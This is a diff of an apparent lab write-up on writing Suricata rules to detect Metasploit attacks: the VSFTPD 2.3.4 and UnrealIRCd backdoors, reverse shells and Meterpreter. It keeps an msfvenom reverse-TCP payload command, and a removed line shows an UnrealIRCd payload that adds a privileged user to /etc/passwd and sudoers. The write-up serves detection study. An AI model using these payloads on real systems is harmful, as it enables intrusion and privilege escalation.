@@ -190,12 +190,7 @@ Meterpreter is a powerful, dynamic payload within Metasploit that provides an in
 
 Challenge: _Create a Suricata rule to detect Meterpreter communication activities by analyzing HTTP or TCP traffic with characteristic Meterpreter payloads._
 
-Metasploit Framework was launched using ```msfconsole``` on the attacker. Using the service versions obtained earlier, an exploit for the VSFTPD 2.3.4 module was found, set up and run using the following sequence of commands:<br>
-
-<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-search.png?raw=true)">
-<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/vsftpd-settings.png?raw=true">
-
-The Meterpreter payload was then generated using msfvenom in a separate terminal:<br>
+Metasploit Framework was launched using ```msfconsole``` on the attacker and the VSFTPD vulnerability was setup and executed as before (see the images in the previous subsection). The Meterpreter payload was then generated using msfvenom in a separate terminal:<br>
 ```msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.8.134 LPORT=87 -f elf > meter.elf```<br>
 
 The attacker then hosted the payload on a Python web server in another terminal:<br>
@@ -276,15 +271,19 @@ Hence, to improve detection, additional rules should be created to match pattern
 
 ### Metasploit Exploit Payload - Unreal IRC 3281 (add user payload)
 
-This attack works by leveraging a hardcoded backdoor in the UnrealIRCd 3.2.8.1 software that is triggered by "AB;" followed by an arbitrary system command. This appeared in 2 packet payloads sent from the attacker on port 6667 as:
-```
-AB;echo 'metasploit:$1$Az$kf0BaRSqaSF9ewhqk5sMa :1121:1121::/://bin/sh'>>/etc/passwd;[ -f /etc/sudoers ]&&(echo 'metasploit ALL=(ALL:ALL) ALL'>>/etc/sudoers)
-```
-Informed by this, the rule is triggered when a packet contains the keyword "echo" to write a new user (metasploit, as seen in the options section in Methodology) into the /etc/passwd file or modify privileged access settings in the /etc/sudoers file. Additionally, a PCRE (Perl-Compatible Regular Expression) pattern is used to match attempts to access the aforementioned critical system files, further refining detection. By specifically targeting the combination of "echo" and these sensitive file paths, the rule effectively identifies the command injection technique used in the exploit.
+This attack's hardcoded backdoor trigger "AB;" followed by an arbitrary system command, was instrumental in the crafting of this rule. It was identified in 2 packet payloads sent from the attacker on port 6667, the most important being:<br>
 
-While this rule provides strong detection capabilities for this particular payload, it could be improved by including rules that address other Unreal IRC 3.2.8.1 payload signatures.
+<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/unreal-irc-packets.png">
+
+The corresponding rule is triggered when a packet contains the keyword "echo" to write a new user (metasploit, as seen in the Methodology section) into the /etc/passwd file or modify privileged access settings in the /etc/sudoers file. Additionally, a PCRE (Perl-Compatible Regular Expression) pattern is used to match attempts to access the aforementioned critical system files, further refining detection. By specifically targeting the combination of "echo" and these sensitive file paths, the rule effectively identifies the command injection technique used in the exploit.
+
+While this rule provides strong detection capabilities for this particular payload, it could be improved by including rules that address other Unreal IRC 3.2.8.1 payloads. As seen in the Methodology section, the remaining payloads are various exploits that spawn shells, hence findings from the shell exploit rules developed here and their unique signatures could be of use.
 
 ### Metasploit Reverse Shell - Leveraging the VSFTPD 2.3.4 vulnerability
+
+Similar to the previous exploit, this one is activated by a ":)" string following a username, however unlike the previous exploit, the bind shell (the default payload) is not a reverse shell. A reverse shell connection must be initiated by the victim to the attacker. Developing this rule was made possible through referring to the system's known services in use. Outgoing network connections initiated on port 17000 (randomly selected for this attack) was unusual as the port is associated with Kapersky proxy servers (according to [this source](https://www.speedguide.net/port.php?port=17000)) which should not be used on the defended network. [This source](https://www.youtube.com/watch?v=HAGrnDZhUto) mentions the port's occasional use by HikVision devices for streaming. Such devices are also not part of this network infrastructure, hence it was deemed appropriate to craft a rule directly monitoring this connection.
+
+Several limitations exist. Detecting a reverse shell solely by monitoring port 17000 is ineffective, as attackers can easily change ports or use common ones like 443 or 80 to blend in with legitimate traffic. Reverse shells can be initiated using various tools, each with different communication patterns, making signature-based detection unreliable and prone to false negatives if the attack method varies. Instead of relying on fixed port monitoring, a better approach is to track uncommon outbound connections, such as a workstation establishing an interactive session with an unknown external IP. Additionally, detecting protocol anomalies, like an HTTP connection behaving like an interactive shell, can help identify suspicious behavior. Given the adaptability of reverse shells, a defense-in-depth strategy—including behavioral analysis, heuristic detection, and active SOC monitoring—provides a more robust and adaptive defense against these threats.
 
 ### Metasploit Meterpreter Communication - Upgrading the VSFTPD 2.3.4 shell
 
